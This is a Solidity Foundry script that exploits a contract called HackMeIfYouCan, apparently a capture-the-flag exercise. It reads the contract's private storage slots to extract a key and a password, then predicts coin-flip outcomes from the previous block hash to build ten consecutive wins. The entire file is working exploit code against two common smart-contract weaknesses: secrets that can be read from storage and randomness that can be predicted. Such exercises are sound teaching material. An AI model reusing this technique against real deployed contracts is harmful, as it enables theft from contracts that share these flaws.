// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface HackMeIfYouCan {
    function getConsecutiveWins(address _addr) external view returns (uint256);
    function flip(bool _guess) external returns (bool);
    function sendKey(bytes16 _key) external;
    function sendPassword(bytes32 _password) external;
}

contract GenerateConsecutiveWins is Script {
    uint256 constant FACTOR = 6275657625726723324896521676682367236752985978263786257989175917;

    function run() external {
        address payable contractAddress = payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
        address myWallet = 0x351024A4EC50612C8D1CF70cd508F77f37Da53F8;

        vm.startBroadcast(myWallet);

        HackMeIfYouCan hackMe = HackMeIfYouCan(contractAddress);

        // Load the key and password
        bytes32 dataKey = vm.load(contractAddress, bytes32(uint256(16)));
        console.log("Loaded key:");
        console.logBytes16(bytes16(dataKey));
        hackMe.sendKey(bytes16(dataKey));

        bytes32 dataPassword = vm.load(contractAddress, bytes32(uint256(3)));
        console.logBytes32(dataPassword);
        hackMe.sendPassword(dataPassword);

        uint256 consecutiveWins = hackMe.getConsecutiveWins(myWallet);

        for (uint i = consecutiveWins; i < 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool guess = coinFlip == 1 ? true : false;

            console.log("Block number:", block.number);
            console.log("Block value:", blockValue);
            console.log("Coin flip:", coinFlip);
            console.log("Guess:", guess);

            try hackMe.flip(guess) returns (bool result) {
                console.log("Flip result:", result);
                if (result) {
                    consecutiveWins++;
                } else {
                    consecutiveWins = 0;
                    break;  // If a flip fails, stop the loop to avoid further errors
                }
            } catch {
                console.log("Revert occurred during flip");
                break;
            }

            console.log("Current consecutive wins:", consecutiveWins);

            // Avanzar el bloque
            vm.roll(block.number + 1);

            vm.warp(block.timestamp + 15);
        }

        // Verificar las victorias consecutivas
        consecutiveWins = hackMe.getConsecutiveWins(myWallet);
        console.log("Consecutive wins for my wallet: ", consecutiveWins);

        vm.stopBroadcast();
    }
}
